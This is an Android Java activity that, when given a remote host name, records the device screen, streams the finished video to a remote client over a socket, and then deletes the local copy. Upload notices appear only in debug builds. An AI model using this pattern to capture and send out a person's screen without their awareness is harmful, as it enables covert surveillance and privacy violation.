package com.view.core.activitys;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.graphics.PixelFormat;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.provider.Settings;
import android.support.annotation.Nullable;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.widget.Toast;

import com.view.core.MyApplication;
import com.view.core.services.ScreenRecordService;
import com.view.core.services.ScreenUtil;
import com.view.core.thread.ClientThread;
import com.view.core.thread.Constant;
import com.view.core.utils.CommonUtil;
import com.view.core.utils.FloatViewUtil;
import com.view.core.utils.PermissionUtils;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;

import Android.view.core.R;

import static android.support.v4.content.PermissionChecker.PERMISSION_DENIED;

public class ScreenRecordActivity extends Activity {

    private static final String TAG = ScreenRecordActivity.class.getSimpleName();
    private Context mContext = ScreenRecordActivity.this;

    private int REQUEST_CODE = 1;
    private String remoteHost;
    private String mScreenFile;

    private Handler mHandler = new Handler();

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
//        setContentView(R.layout.main_activity);

        Bundle bundle = getIntent().getBundleExtra("data");
        if(bundle != null)
            remoteHost = bundle.getString(Constant.KEY_HOSTNAME);
        Log.d(TAG, "onCreate: remote hostname="+ remoteHost);
        FloatViewUtil.getInstance().showFloatingWindow(mContext);

        CommonUtil.init(this);
        PermissionUtils.checkPermission(this);
        getScreenServiceConnection();
    }
    /**
     * 开启录制 Service
     */
    private ServiceConnection getScreenServiceConnection(){
        ServiceConnection connection = ((MyApplication)getApplication()).getScreenServiceConnection();
        if(connection == null) {
            connection = new ServiceConnection() {
                @Override
                public void onServiceConnected(ComponentName name, IBinder service) {
                    ScreenRecordService.RecordBinder recordBinder = (ScreenRecordService.RecordBinder) service;
                    ScreenRecordService screenRecordService = recordBinder.getRecordService();
                    ScreenUtil.setScreenService(screenRecordService);

                    ScreenUtil.startScreenRecord(ScreenRecordActivity.this, REQUEST_CODE);
                }

                @Override
                public void onServiceDisconnected(ComponentName name) {
                    ScreenUtil.stopScreenRecord(ScreenRecordActivity.this);
                }
            };
        }

        Intent intent = new Intent(this, ScreenRecordService.class);
        bindService(intent, connection, BIND_AUTO_CREATE);

        ScreenUtil.addRecordListener(recordListener);
        ((MyApplication)getApplication()).setScreenServiceConnection(connection);
        return connection;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        for (int temp : grantResults) {
            if (temp == PERMISSION_DENIED) {
                Intent intent = new Intent();
                intent.setAction(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                intent.setData(Uri.parse("package:" + ScreenRecordActivity.this.getPackageName()));
                ScreenRecordActivity.this.startActivity(intent);
                break;
            }
        }
    }

    private ScreenUtil.RecordListener recordListener = new ScreenUtil.RecordListener() {
        @Override
        public void onStartRecord() {

        }

        @Override
        public void onPauseRecord() {

        }

        @Override
        public void onResumeRecord() {

        }

        @Override
        public void onStopRecord(String filePath) {
            mScreenFile = filePath;
            try {
                ClientThread thread = ((MyApplication)getApplication()).getRemoteClient();
                if(thread != null) thread.hangUp(false);
                Thread.sleep(1000);
                if(Constant.isDebug) {
                    mHandler.post(new Runnable() {
                        @Override
                        public void run() {
                            Toast.makeText(mContext, "开始上传文件", Toast.LENGTH_SHORT).show();
                        }
                    });
                }
                uploadFile(mScreenFile, Constant.TYPE_SCREEN);
            } catch (JSONException e) {
                e.printStackTrace();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            unbindService(getScreenServiceConnection());
        }

        @Override
        public void onRecording(String timeTip) {
        }
    };

    private void uploadFile(String filePath, String fileType) throws JSONException {
        Log.d(TAG, "uploadFile: path="+ filePath+ ", type="+ fileType);
        File mFile = null;
        JSONObject json = new JSONObject();
        json.put(Constant.KEY_CMD, Constant.CMD_RETURN_REMOTE_DEVICE);
        json.put(Constant.KEY_HOSTNAME, remoteHost);
        if(filePath != null){
            mFile = new File(filePath);
            json.put(Constant.KEY_FILE, mFile.getName());
            json.put(Constant.KEY_LENGTH, mFile.length());
        }

        String temp = json.toString()+ "\n";
        byte[] data = temp.getBytes();
        ((MyApplication)getApplication()).getRemoteClient().writeData(data, data.length);

        try {
            FileInputStream fis = new FileInputStream(mFile);
            int ret = -1;
            byte[] result = new byte[1024];
            while ((ret = fis.read(result)) != -1) {
                ((MyApplication)getApplication()).getRemoteClient().writeData(result, ret);
            }
            Log.d(TAG, "uploadFile: upload success");
            if(Constant.isDebug) {
                mHandler.post(new Runnable() {
                    @Override
                    public void run() {
                        Toast.makeText(mContext, "上传成功", Toast.LENGTH_SHORT).show();
                    }
                });
            }
            mFile.delete();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_CODE && resultCode == Activity.RESULT_OK){
            try {
                ScreenUtil.setUpData(resultCode,data);
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else {
            Toast.makeText(this,"拒绝录屏", Toast.LENGTH_SHORT).show();
        }
    }

}
